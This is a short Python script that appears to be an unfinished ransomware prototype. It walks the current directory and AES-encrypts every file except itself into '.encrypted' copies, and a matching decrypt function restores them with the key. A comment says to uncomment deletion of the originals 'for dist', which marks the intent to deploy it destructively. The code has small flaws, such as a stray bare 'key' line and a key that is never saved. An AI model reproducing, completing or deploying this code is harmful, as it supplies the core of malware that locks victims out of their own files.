import pyAesCrypt
import os
import sys
from Crypto.Random import get_random_bytes

def aes_keygen():
    aes_key = get_random_bytes(16)
    return aes_key

def decrypt(key):
    cwd = os.getcwd()
    key
    for root,dirs,files in os.walk(cwd):
        for file in files:
            
            encrypted = (root+"\\"+file)
            file_path,file_ext = os.path.splitext(root+"\\"+file)
            decrypted = file_path
            
            if file_ext == ".encrypted":
                try:
                    print("Attempting to decrypt",str(encrypted))
                    pyAesCrypt.decryptFile(encrypted, decrypted, key)
                    print("Decrypting",str(encrypted))
                    os.remove(encrypted)
                except:
                    print("Error!Invalid key.")
def encrypt(key,me):
    cwd=os. getcwd()
    for root,dirs,files in os.walk(cwd):
        for file in files:
            file_path, file_ext = os.path.splitext(root+'\\'+file)
            
            original = (root+'\\'+file)
            newfile = os.path.join(original+'.encrypted')
            if (root+'\\'+file) != (root + '\\' + sys.argv[0]):
                print("encrypting",original)
                pyAesCrypt.encryptFile(original,newfile,key)
                #os.remove(original)
                #uncomment above for dist
